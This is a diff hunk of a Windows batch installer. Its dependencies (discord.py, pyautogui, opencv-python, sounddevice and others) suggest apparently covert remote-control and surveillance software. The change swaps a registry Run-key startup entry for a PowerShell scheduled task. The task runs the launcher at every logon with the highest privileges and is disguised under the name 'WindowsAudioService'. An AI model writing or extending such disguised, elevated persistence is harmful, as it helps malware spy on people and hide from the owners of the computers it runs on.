@@ -55,8 +55,8 @@ py -m pip install discord.py psutil pillow opencv-python pyautogui sounddevice s
 echo [OK] Dependencies installed.
 
 echo.
-echo [*] Adding to startup...
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" /t REG_SZ /d "cmd /c start /min \"\" \"%INSTALL_DIR%\launcher.bat\"" /f >nul
+echo [*] Adding to startup via scheduled task...
+powershell -Command "$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument \"/c \\\"%INSTALL_DIR%\launcher.bat\\\"\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName 'WindowsAudioService' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force"
 echo [OK] Added to startup.
 
 echo.
